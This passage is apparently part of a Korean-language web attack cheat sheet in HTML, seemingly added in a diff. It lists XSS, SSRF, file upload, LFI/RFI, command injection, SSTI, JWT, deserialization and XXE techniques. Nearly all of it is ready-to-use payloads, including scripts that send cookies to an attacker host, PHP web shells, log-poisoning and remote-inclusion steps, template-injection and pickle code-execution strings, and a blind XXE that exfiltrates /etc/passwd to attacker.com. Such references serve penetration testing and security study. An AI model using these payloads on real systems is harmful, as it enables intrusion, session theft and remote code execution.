+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>&quot;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>&#39;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>javascript:alert(1)
+</code></pre></div>
+<h3 id="stored-xss">Stored XSS</h3>
+<p>게시판, 댓글, 프로필 등에 스크립트를 저장하여 다른 사용자가 해당 페이지 방문 시 실행되도록 한다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cm">&lt;!-- 쿠키 탈취 --&gt;</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://&lt;attacker&gt;/c?=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="cm">&lt;!-- fetch로 전송 --&gt;</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://&lt;attacker&gt;/c?=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="dom-based-xss">DOM-based XSS</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">// URL fragment를 통한 injection</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1">// 취약 코드: document.write(location.hash)</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nx">http</span><span class="o">:</span><span class="c1">//target.com/page#&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</code></pre></div>
+<h3 id="_6">필터 우회</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cm">&lt;!-- 대소문자 --&gt;</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">ScRiPt</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">ScRiPt</span><span class="p">&gt;</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="cm">&lt;!-- 이벤트 핸들러 --&gt;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="p">&lt;</span><span class="nt">details</span> <span class="na">open</span> <span class="na">ontoggle</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="cm">&lt;!-- encoding --&gt;</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;YWxlcnQoMSk=&#39;</span><span class="p">))&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="cm">&lt;!-- 태그 블랙리스트 우회 --&gt;</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">animate</span> <span class="na">onbegin</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">attributeName</span><span class="o">=</span><span class="s">x</span> <span class="na">dur</span><span class="o">=</span><span class="s">1s</span><span class="p">&gt;</span>
+</code></pre></div>
+<hr />
+<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 내부 서비스 접근</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>http://127.0.0.1:80
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>http://localhost:80
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>http://<span class="o">[</span>::1<span class="o">]</span>:80
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># AWS Metadata</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>http://169.254.169.254/latest/meta-data/
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="c1"># 우회 기법</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>http://0x7f000001<span class="w">         </span><span class="c1"># hex</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>http://2130706433<span class="w">         </span><span class="c1"># decimal</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>http://017700000001<span class="w">       </span><span class="c1"># octal</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>http://127.1<span class="w">              </span><span class="c1"># short form</span>
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>http://0.0.0.0
+</code></pre></div>
+<hr />
+<h2 id="file-upload">File Upload</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># 확장자 우회</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>shell.php<span class="w"> </span>→<span class="w"> </span>shell.php5,<span class="w"> </span>shell.phtml,<span class="w"> </span>shell.phar,<span class="w"> </span>shell.phps
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>shell.asp<span class="w"> </span>→<span class="w"> </span>shell.aspx,<span class="w"> </span>shell.ashx,<span class="w"> </span>shell.asmx
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>shell.jsp<span class="w"> </span>→<span class="w"> </span>shell.jspx
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># Content-Type 우회 (Burp에서 변경)</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>Content-Type:<span class="w"> </span>image/jpeg
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Content-Type:<span class="w"> </span>image/png
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="c1"># 이중 확장자</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>shell.php.jpg
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>shell.jpg.php
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="c1"># Null byte (구 버전)</span>
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>shell.php%00.jpg
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>shell.php<span class="se">\x</span><span class="m">00</span>.jpg
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="c1"># .htaccess 업로드 (Apache)</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="c1"># 파일명: .htaccess, 내용:</span>
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a>AddType<span class="w"> </span>application/x-httpd-php<span class="w"> </span>.jpg
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a><span class="c1"># 웹쉘 예시 (PHP)</span>
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a>&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;
+</code></pre></div>
+<hr />
+<h2 id="lfi-rfi-file-inclusion">LFI / RFI (File Inclusion)</h2>
+<h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># 기본 경로 순회
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>../../../../etc/passwd
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>....//....//....//etc/passwd
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a># Null byte (PHP &lt; 5.3)
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>../../../../etc/passwd%00
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a># Wrapper
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>php://filter/convert.base64-encode/resource=index.php
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>php://input (POST body에 PHP 코드)
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>data://text/plain,&lt;?php system(&#39;id&#39;); ?&gt;
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a># Windows
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>..\..\..\..\windows\system32\drivers\etc\hosts
+</code></pre></div>
+<h3 id="log-poisoning-lfi-rce">Log Poisoning (LFI → RCE)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Apache access.log에 PHP 코드 삽입</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span>&lt;url&gt;
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c1"># 이후 LFI로 로그 파일 include</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>&lt;url&gt;?page<span class="o">=</span>../../../../var/log/apache2/access.log<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
+</code></pre></div>
+<h3 id="rfi-remote-file-inclusion">RFI (Remote File Inclusion)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># php.ini에서 allow_url_include=On 이어야 가능
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>http://target.com?page=http://attacker.com/shell.php
+</code></pre></div>
+<hr />
+<h2 id="command-injection">Command Injection</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 기본 구분자</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="p">;</span><span class="w"> </span>id
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="p">|</span><span class="w"> </span>id
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="o">||</span><span class="w"> </span>id
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="p">&amp;</span><span class="w"> </span>id
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="o">&amp;&amp;</span><span class="w"> </span>id
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1"># 줄바꿈</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>%0a<span class="w"> </span>id
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>%0d%0a<span class="w"> </span>id
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="c1"># 백틱/달러</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="sb">`</span>id<span class="sb">`</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="k">$(</span>id<span class="k">)</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="c1"># 필터 우회</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="c1"># 공백 필터링</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="o">{</span>cat,/etc/passwd<span class="o">}</span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>cat<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>/etc/passwd
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>cat<span class="nv">$IFS</span>/etc/passwd
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="c1"># 키워드 필터링</span>
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>c<span class="s1">&#39;a&#39;</span>t<span class="w"> </span>/etc/passwd
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>c<span class="s2">&quot;a&quot;</span>t<span class="w"> </span>/etc/passwd
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>c<span class="se">\a</span>t<span class="w"> </span>/etc/passwd
+</code></pre></div>
+<hr />
+<h2 id="ssti-server-side-template-injection">SSTI (Server-Side Template Injection)</h2>
+<h3 id="_7">탐지</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a># 기본 탐지 페이로드
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>{{7*7}}       → 49이면 Jinja2/Twig
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>${7*7}        → 49이면 Freemarker/Velocity
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>#{7*7}        → 49이면 Thymeleaf
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>&lt;%= 7*7 %&gt;    → 49이면 ERB
+</code></pre></div>
+<h3 id="_8">익스플로잇</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Jinja2 (Python)</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="p">{{</span> <span class="n">config</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="p">}}</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="p">}}</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">&lt;</span><span class="n">idx</span><span class="o">&gt;</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span> <span class="p">}}</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c1"># 간단한 RCE</span>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1">// Freemarker (Java)</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">ex</span><span class="o">=</span><span class="s">&quot;freemarker.template.utility.Execute&quot;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="w"> </span><span class="n">ex</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+<hr />
+<h2 id="jwt">JWT 공격</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># JWT 디코딩 (base64)</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;jwt_token&gt;&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;.&#39;</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># None Algorithm</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c1"># Header를 {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}로 변경, signature 제거</span>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># 약한 Secret 크래킹</span>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span>jwt.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--format<span class="o">=</span>HMAC-SHA256<span class="w"> </span>jwt.txt
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="c1"># jwt_tool</span>
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-C<span class="w"> </span>-d<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-X<span class="w"> </span>a<span class="w">    </span><span class="c1"># alg:none</span>
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>python3<span class="w"> </span>jwt_tool.py<span class="w"> </span>&lt;token&gt;<span class="w"> </span>-X<span class="w"> </span>k<span class="w">    </span><span class="c1"># key confusion</span>
+</code></pre></div>
+<hr />
+<h2 id="deserialization">Deserialization</h2>
+<h3 id="php">PHP</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">// PHP Object Injection</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;b:1;}</span>
+</code></pre></div>
+<h3 id="java">Java</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># ysoserial</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections1<span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># 탐지: rO0AB (base64), aced0005 (hex)</span>
+</code></pre></div>
+<h3 id="python-pickle">Python (Pickle)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="k">class</span><span class="w"> </span><span class="nc">Exploit</span><span class="p">:</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,))</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">()))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div>
+<hr />
+<h2 id="xxe-xml-external-entity">XXE (XML External Entity)</h2>
+<h3 id="xxe">기본 XXE</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>]&gt;
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<h3 id="blind-xxe-out-of-band">Blind XXE (Out-of-Band)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cm">&lt;!-- 공격자 DTD (attacker.com/evil.dtd) --&gt;</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="cp">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://attacker.com/?d=%file;&#39;&gt;</span>&quot;&gt;
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>%eval;
